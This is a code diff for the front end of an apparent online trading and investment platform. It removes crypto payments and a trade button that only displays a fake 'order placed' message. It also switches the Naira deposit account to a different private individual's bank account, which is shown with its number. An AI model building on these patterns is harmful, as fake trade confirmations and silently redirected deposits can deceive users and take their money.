                     uid: currentUser.uid,
@@ -5447,12 +5269,12 @@ if (userData.country) { const el = document.getElementById('c-input'); if(el) el
                     amount: amount,
                     status: 'processing',
                     timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-                    metadata: { method: isCrypto ? 'Crypto (TON)' : 'Bank Transfer (NGN)', username: userData
+                    metadata: { method: 'Bank Transfer (NGN)', username: userData
                             .firstName || "User", userEmail: currentUser.email || "", bankDetails: document
                             .getElementById('bank-input').value || "", accountNumber: document.getElementById(
                                 'ngn-acc-num').value || "", accountName: document.getElementById('ngn-acc-name')
-                            .value || "", walletAddress: document.getElementById('crypto-address').value || "",
-                        nairaAmount: isCrypto ? null : `N${(amount * 1350).toLocaleString()}` }
+                            .value || "",
+                        nairaAmount: `N${(amount * 1350).toLocaleString()}` }
                 };
                 await db.collection("transactions").add(txData);
                 await db.collection("requests").add({ ...txData, userId: currentUser.uid, method: txData.metadata
@@ -5465,7 +5287,7 @@ if (userData.country) { const el = document.getElementById('c-input'); if(el) el
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         chat_id: "-1003903750289",
-                        text: `🏦 <b>New Withdrawal Request</b>\n👤 User: ${userData.firstName || "Unknown"}\n📧 Email: ${currentUser.email || "N/A"}\n💵 Amount: $${amount}\n🔄 Method: ${isCrypto ? "Crypto (TON)" : "Bank Transfer (NGN)"}\n⏰ Time: ${new Date().toLocaleString()}`,
+                        text: `🏦 <b>New Withdrawal Request</b>\n👤 User: ${userData.firstName || "Unknown"}\n📧 Email: ${currentUser.email || "N/A"}\n💵 Amount: $${amount}\n🔄 Method: Bank Transfer (NGN)\n⏰ Time: ${new Date().toLocaleString()}`,
                         parse_mode: "HTML"
                     })
                 }).catch(() => {});
@@ -5475,7 +5297,7 @@ if (userData.country) { const el = document.getElementById('c-input'); if(el) el
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         chat_id: "-1003903750289",
-                        text: `🏦 <b>New Withdrawal Request</b>\n👤 User: ${userData.firstName || "Unknown"}\n📧 Email: ${currentUser.email || "N/A"}\n💵 Amount: $${amount}\n🔄 Method: ${isCrypto ? "Crypto (TON)" : "Bank Transfer (NGN)"}\n⏰ Time: ${new Date().toLocaleString()}`,
+                        text: `🏦 <b>New Withdrawal Request</b>\n👤 User: ${userData.firstName || "Unknown"}\n📧 Email: ${currentUser.email || "N/A"}\n💵 Amount: $${amount}\n🔄 Method: Bank Transfer (NGN)\n⏰ Time: ${new Date().toLocaleString()}`,
                         parse_mode: "HTML"
                     })
                 }).catch(() => {});
@@ -5982,7 +5804,7 @@ window.removeMT5Account = removeMT5Account;
 
         window.onclick = (e) => {
             const modals = ['convert-modal', 'welcome-popup', 'referral-history-modal', 'referral-network-modal',
-                'kyc-lock-modal', 'alert-modal', 'buy-confirm-modal', 'deposit-proof-modal',
+                'kyc-lock-modal', 'alert-modal', 'buy-confirm-modal',
                 'dashboard-support-modal', 'leaderboard-modal', 'naira-bank-modal', 'naira-confirm-modal', 'mt5-terminal-modal', 'pnl-modal', 'pnl-modal', 'pnl-modal', 'pnl-modal', 'pnl-modal', 'pnl-modal', 'pnl-modal', 'pnl-modal', 'pnl-modal', 'mt5-terminal-modal', 'mt5-terminal-modal'
             ];
             if (modals.includes(e.target.id)) e.target.style.display = 'none';
@@ -6058,21 +5880,6 @@ window.removeMT5Account = removeMT5Account;
         let nairaPendingAmountNGN = 0;
         let nairaPendingAmountUSD = 0;
 
-        function switchDepositTab(tab) {
-            const usdBtn = document.getElementById('tab-usd');
-            const nairaBtn = document.getElementById('tab-naira');
-            const usdContent = document.getElementById('deposit-usd-content');
-            const nairaContent = document.getElementById('deposit-naira-content');
-            if (tab === 'usd') { usdBtn.classList.add('active');
-                nairaBtn.classList.remove('active');
-                usdContent.classList.remove('hidden');
-                nairaContent.classList.add('hidden'); } else { usdBtn.classList.remove('active');
-                nairaBtn.classList.add('active');
-                usdContent.classList.add('hidden');
-                nairaContent.classList.remove('hidden');
-                syncNairaPendingList(); }
-        }
-
         function calculateNairaDeposit(val) { const ngn = parseFloat(val) || 0; const usd = parseFloat((ngn /
                 NAIRA_RATE).toFixed(2));
             document.getElementById('naira-usd-display').innerText = '$' + usd.toLocaleString(undefined, {
@@ -6145,9 +5952,9 @@ if (!last5Digits || last5Digits.length !== 5 || !/^\d{5}$/.test(last5Digits)) {
     firstName: userData.firstName || "User",
     amountNGN: amountNGN,
     amountUSD: amountUSD,
-    bankName: "Palmpay Limited",
-    accountName: "IDOWU AWE(VistaPay) Awe",
-    accountNumber: "6685215756",
+    bankName: "Opay",
+    accountName: "CHINEDU EMMANUEL",
+    accountNumber: "8037912766",
     senderBank: senderBank,
     senderName: senderName,
     senderNameNormalized: senderName.toUpperCase().trim(),
@@ -6160,7 +5967,7 @@ if (!last5Digits || last5Digits.length !== 5 || !/^\d{5}$/.test(last5Digits)) {
                     "transactions").add({ uid: currentUser.uid, type: 'Naira Deposit', amount: amountUSD,
                     status: 'pending', timestamp: firebase.firestore.FieldValue.serverTimestamp(), metadata: {
                         amountNGN: amountNGN, senderBank: senderBank, senderName: senderName, receiptImage: receiptUrl,
-                        depositRequestId: docRef.id, bankName: "Palmpay Limited", accountName: "IDOWU AWE(VistaPay) Awe" } });
+                        depositRequestId: docRef.id, bankName: "Opay", accountName: "CHINEDU EMMANUEL" } });
             closeNairaConfirmModal();
             showNairaToast('Deposit submitted! Verification in 15 minutes.');
             document.getElementById('naira-deposit-input').value = '';
@@ -6196,7 +6003,6 @@ if (!last5Digits || last5Digits.length !== 5 || !/^\d{5}$/.test(last5Digits)) {
                             '</span><span class="text-[9px] font-black text-yellow-600">$' + (data.amountUSD || 0)
                             .toFixed(2) + '</span></div></div>';
                     }).join(''); }, err => { console.error("Naira pending sync error:", err); }); }
-        window.switchDepositTab = switchDepositTab;
         window.calculateNairaDeposit = calculateNairaDeposit;
         window.openNairaBankDetails = openNairaBankDetails;
         window.closeNairaBankModal = closeNairaBankModal;
@@ -6207,61 +6013,6 @@ if (!last5Digits || last5Digits.length !== 5 || !/^\d{5}$/.test(last5Digits)) {
         window.submitNairaDeposit = submitNairaDeposit;
         window.showNairaToast = showNairaToast;
         window.syncNairaPendingList = syncNairaPendingList;
-   // ── CRYPTO PAYMENT SYSTEM ──
-const RAILWAY_URL = 'https://cyrus-nowpayments-webhook-production.up.railway.app';
-let currentPayAddress = '';
-
-let selectedCurrency = 'sol';
-
-async function createCryptoPayment(amount) {
-    if (!currentUser) { alert('Please login first.'); return; }
-    document.getElementById('crypto-buttons-box').style.display = 'none';
-    document.getElementById('crypto-loading-box').style.display = 'block';
-    document.getElementById('crypto-payment-box').style.display = 'none';
-    try {
-        const response = await fetch(`${RAILWAY_URL}/create-payment`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ amount: amount, uid: currentUser.uid, email: currentUser.email || '', pay_currency: selectedCurrency })
-        });
-        const data = await response.json();
-        if (data.success) {
-            currentPayAddress = data.pay_address;
-            document.getElementById('crypto-pay-amount').innerText = data.pay_amount + ' ' + data.pay_currency.toUpperCase();
-            document.getElementById('crypto-pay-currency').innerText = 'Send via ' + data.pay_currency.toUpperCase() + ' network';
-            document.getElementById('crypto-pay-address').innerText = data.pay_address;
-            document.getElementById('crypto-payment-id-display').innerText = 'Payment ID: ' + data.payment_id;
-            document.getElementById('crypto-loading-box').style.display = 'none';
-            document.getElementById('crypto-payment-box').style.display = 'block';
-        } else { throw new Error(data.error || 'Payment creation failed'); }
-    } catch (err) {
-        document.getElementById('crypto-loading-box').style.display = 'none';
-        document.getElementById('crypto-buttons-box').style.display = 'block';
-        alert('Error: ' + err.message);
-    }
-}
-function copyPayAddress() {
-    navigator.clipboard.writeText(currentPayAddress).then(() => { showNairaToast('Address copied!'); }).catch(() => { alert('Address: ' + currentPayAddress); });
-}
-function closeCryptoBox() {
-    document.getElementById('crypto-payment-box').style.display = 'none';
-    document.getElementById('crypto-buttons-box').style.display = 'block';
-}
-function selectCurrency(currency, btn) {
-    selectedCurrency = currency;
-    document.querySelectorAll('#currency-selector button').forEach(b => {
-        b.style.background = '#f8fafc';
-        b.style.color = '#0f172a';
-        b.style.border = '1px solid #e2e8f0';
-    });
-    btn.style.background = '#0f172a';
-    btn.style.color = 'white';
-    btn.style.border = 'none';
-}
-window.selectCurrency = selectCurrency;
-window.createCryptoPayment = createCryptoPayment;
-window.copyPayAddress = copyPayAddress;
-window.closeCryptoBox = closeCryptoBox; 
     </script>
 </div>
 
@@ -7573,71 +7324,6 @@ function openImageFullscreen(url) {
     document.getElementById('image-modal') && (document.getElementById('image-modal').style.display = 'flex');
 }
 
-// ════════════════════════════════════════════════════════
-// LIVE TRADING TERMINAL
-// ════════════════════════════════════════════════════════
-let currentLivePair = 'EUR/USD';
-let liveQuoteInterval = null;
-
-function selectLivePair(pair) {
-    currentLivePair = pair;
-    const pairNoSlash = pair.replace('/', '');
-    document.querySelectorAll('.pair-btn-live').forEach(b => {
-        if (b.innerText === pairNoSlash) {
-            b.style.background = '#0f172a';
-            b.style.color = 'white';
-            b.style.borderColor = '#0f172a';
-        } else {
-            b.style.background = '#f8fafc';
-            b.style.color = '#0f172a';
-            b.style.borderColor = '#e2e8f0';
-        }
-    });
-    fetchLiveQuote();
-}
-
-async function fetchLiveQuote() {
-    try {
-        const symbol = currentLivePair.replace('/', '/');
-        const res = await fetch(`/api/quotes?symbols=${encodeURIComponent(symbol)}`);
-        const data = await res.json();
-
-        if (data && data.price) {
-            document.getElementById('chart-error-state').style.display = 'none';
-            const priceEl = document.createElement('div');
-            priceEl.style.cssText = 'padding:20px; text-align:center; font-size:32px; font-weight:900; color:#0f172a;';
-            priceEl.innerText = data.price.toFixed(4);
-            const errorState = document.getElementById('chart-error-state');
-            errorState.parentElement.replaceChild(priceEl, errorState);
-
-            updateBuyBtnColor(data);
-        }
-    } catch (err) {
-        console.log('Quote fetch error:', err);
-    }
-}
-
-function updateBuyBtnColor(quoteData) {
-    const buyBtn = document.getElementById('live-buy-btn');
-    const sellBtn = document.getElementById('live-sell-btn');
-
-    if (quoteData.bid && quoteData.ask) {
-        const mid = (parseFloat(quoteData.bid) + parseFloat(quoteData.ask)) / 2;
-        buyBtn.style.color = '#22c55e';
-        sellBtn.style.color = '#ef4444';
-    }
-}
-
-function executeLiveTrade(direction) {
-    const lotSize = document.getElementById('lot-size').innerText;
-    showNairaToast(`${direction} order placed: ${lotSize} lots on ${currentLivePair}`);
-}
-
-function startLiveQuotePolling() {
-    selectLivePair('EUR/USD');
-    liveQuoteInterval = setInterval(fetchLiveQuote, 5000);
-}
-
 window.openJournal = openJournal;
 window.closeJournal = closeJournal;
 window.openAddTrade = openAddTrade;
@@ -7652,9 +7338,6 @@ window.loadJournalTrades = loadJournalTrades;
 window.filterJournal = filterJournal;
 window.viewTrade = viewTrade;
 window.openImageFullscreen = openImageFullscreen;
-window.selectLivePair = selectLivePair;
-window.executeLiveTrade = executeLiveTrade;
-window.startLiveQuotePolling = startLiveQuotePolling;
     window.openMT5PassGuide = openMT5PassGuide;
     window.closeMT5PassGuide = closeMT5PassGuide;
     window.mt5GuideNav = mt5GuideNav;
@@ -8099,55 +7782,14 @@ window.startLiveQuotePolling = startLiveQuotePolling;
             <i class="fa-solid fa-chevron-right" style="color:#cbd5e1; font-size:12px; margin-left:auto;"></i>
         </button>
 
-        <button onclick="closeDrawer(); switchTab('withdrawal')" class="drawer-menu-item" style="width:100%; display:flex; align-items:center; gap:14px; padding:14px 16px; background:none; border:none; border-radius:16px; cursor:pointer; text-align:left; margin-bottom:4px;">
+        <button onclick="closeDrawer(); switchTab('payments'); switchPaymentsView('withdraw')" class="drawer-menu-item" style="width:100%; display:flex; align-items:center; gap:14px; padding:14px 16px; background:none; border:none; border-radius:16px; cursor:pointer; text-align:left; margin-bottom:4px;">
             <div style="width:38px; height:38px; background:#fef2f2; border-radius:12px; display:flex; align-items:center; justify-content:center; flex-shrink:0;"><i class="fa-solid fa-money-bill-transfer" style="color:#ef4444; font-size:16px;"></i></div>
             <div><p style="font-size:14px; font-weight:800; color:#0f172a; margin:0;">Withdraw</p><p style="font-size:10px; color:#94a3b8; font-weight:600; margin:0;">Cash out your profit</p></div>
             <i class="fa-solid fa-chevron-right" style="color:#cbd5e1; font-size:12px; margin-left:auto;"></i>
         </button>
 
-        <button onclick="closeDrawer(); switchTab('trade')" class="drawer-menu-item" style="width:100%; display:flex; align-items:center; gap:14px; padding:14px 16px; background:none; border:none; border-radius:16px; cursor:pointer; text-align:left; margin-bottom:4px;">
-            <div style="width:38px; height:38px; background:#eff6ff; border-radius:12px; display:flex; align-items:center; justify-content:center; flex-shrink:0;"><i class="fa-solid fa-chart-line" style="color:#3b82f6; font-size:16px;"></i></div>
-            <div><p style="font-size:14px; font-weight:800; color:#0f172a; margin:0;">Trade</p><p style="font-size:10px; color:#94a3b8; font-weight:600; margin:0;">MT5 terminal & credentials</p></div>
-            <i class="fa-solid fa-chevron-right" style="color:#cbd5e1; font-size:12px; margin-left:auto;"></i>
-        </button>
-
-        <button onclick="closeDrawer(); switchTab('analyzer')" class="drawer-menu-item" style="width:100%; display:flex; align-items:center; gap:14px; padding:14px 16px; background:none; border:none; border-radius:16px; cursor:pointer; text-align:left; margin-bottom:4px;">
-            <div style="width:38px; height:38px; background:linear-gradient(135deg,#fef9c3,#fde68a); border-radius:12px; display:flex; align-items:center; justify-content:center; flex-shrink:0;"><i class="fa-solid fa-crown" style="color:#D4AF37; font-size:16px;"></i></div>
-            <div><p style="font-size:14px; font-weight:800; color:#0f172a; margin:0;">Cyrus AI</p><p style="font-size:10px; color:#94a3b8; font-weight:600; margin:0;">Chart screenshot analyzer</p></div>
-            <i class="fa-solid fa-chevron-right" style="color:#cbd5e1; font-size:12px; margin-left:auto;"></i>
-        </button>
-
-        <button onclick="closeDrawer(); switchTab('kyc')" class="drawer-menu-item" style="width:100%; display:flex; align-items:center; gap:14px; padding:14px 16px; background:none; border:none; border-radius:16px; cursor:pointer; text-align:left; margin-bottom:4px;">
-            <div style="width:38px; height:38px; background:#f5f3ff; border-radius:12px; display:flex; align-items:center; justify-content:center; flex-shrink:0;"><i class="fa-solid fa-user-shield" style="color:#8b5cf6; font-size:16px;"></i></div>
-            <div><p style="font-size:14px; font-weight:800; color:#0f172a; margin:0;">Profile & KYC</p><p style="font-size:10px; color:#94a3b8; font-weight:600; margin:0;">Verify your identity</p></div>
-            <i class="fa-solid fa-chevron-right" style="color:#cbd5e1; font-size:12px; margin-left:auto;"></i>
-        </button>
-
-        <button onclick="closeDrawer(); openLeaderboard()" class="drawer-menu-item" style="width:100%; display:flex; align-items:center; gap:14px; padding:14px 16px; background:none; border:none; border-radius:16px; cursor:pointer; text-align:left; margin-bottom:4px;">
-            <div style="width:38px; height:38px; background:#fef9c3; border-radius:12px; display:flex; align-items:center; justify-content:center; font-size:18px; flex-shrink:0;">🏆</div>
-            <div><p style="font-size:14px; font-weight:800; color:#0f172a; margin:0;">Leaderboard</p><p style="font-size:10px; color:#94a3b8; font-weight:600; margin:0;">Weekly profit rankings</p></div>
-            <i class="fa-solid fa-chevron-right" style="color:#cbd5e1; font-size:12px; margin-left:auto;"></i>
-        </button>
-
-        <button onclick="closeDrawer(); openJournal()" class="drawer-menu-item" style="width:100%; display:flex; align-items:center; gap:14px; padding:14px 16px; background:none; border:none; border-radius:16px; cursor:pointer; text-align:left; margin-bottom:4px;">
-            <div style="width:38px; height:38px; background:#f0fdf4; border-radius:12px; display:flex; align-items:center; justify-content:center; flex-shrink:0;"><i class="fa-solid fa-book-open" style="color:#22c55e; font-size:16px;"></i></div>
-            <div><p style="font-size:14px; font-weight:800; color:#0f172a; margin:0;">Trading Journal</p><p style="font-size:10px; color:#94a3b8; font-weight:600; margin:0;">Track your trades</p></div>
-            <i class="fa-solid fa-chevron-right" style="color:#cbd5e1; font-size:12px; margin-left:auto;"></i>
-        </button>
-
         <div style="height:1px; background:rgba(212,175,55,0.15); margin:12px 4px;"></div>
         <p style="font-size:9px; font-weight:800; color:#94a3b8; text-transform:uppercase; letter-spacing:0.2em; margin:8px 12px 10px;">Account</p>
-
-        <button onclick="closeDrawer(); openCertificates()" class="drawer-menu-item" style="width:100%; display:flex; align-items:center; gap:14px; padding:14px 16px; background:none; border:none; border-radius:16px; cursor:pointer; text-align:left; margin-bottom:4px;">
-            <div style="width:38px; height:38px; background:linear-gradient(135deg,#fef9c3,#D4AF37); border-radius:12px; display:flex; align-items:center; justify-content:center; flex-shrink:0;"><i class="fa-solid fa-trophy" style="color:#854d0e; font-size:16px;"></i></div>
-            <div><p style="font-size:14px; font-weight:800; color:#0f172a; margin:0;">My Certificates</p><p style="font-size:10px; color:#94a3b8; font-weight:600; margin:0;">View your profit milestones</p></div>
-            <i class="fa-solid fa-chevron-right" style="color:#cbd5e1; font-size:12px; margin-left:auto;"></i>
-        </button>
-        <button onclick="closeDrawer(); openPartnerModal()" class="drawer-menu-item" style="width:100%; display:flex; align-items:center; gap:14px; padding:14px 16px; background:none; border:none; border-radius:16px; cursor:pointer; text-align:left; margin-bottom:4px;">
-            <div style="width:38px; height:38px; background:linear-gradient(135deg,#0f172a,#1a1200); border-radius:12px; display:flex; align-items:center; justify-content:center; flex-shrink:0;"><i class="fa-solid fa-medal" style="color:#D4AF37; font-size:16px;"></i></div>
-            <div><p style="font-size:14px; font-weight:800; color:#0f172a; margin:0;">Partner Program</p><p style="font-size:10px; color:#94a3b8; font-weight:600; margin:0;">Your referral level</p></div>
-            <i class="fa-solid fa-chevron-right" style="color:#cbd5e1; font-size:12px; margin-left:auto;"></i>
-        </button>
 
         <button onclick="handleLogout()" class="drawer-menu-item" style="width:100%; display:flex; align-items:center; gap:14px; padding:14px 16px; background:none; border:none; border-radius:16px; cursor:pointer; text-align:left;">
             <div style="width:38px; height:38px; background:#fef2f2; border-radius:12px; display:flex; align-items:center; justify-content:center; flex-shrink:0;"><i class="fa-solid fa-right-from-bracket" style="color:#ef4444; font-size:16px;"></i></div>
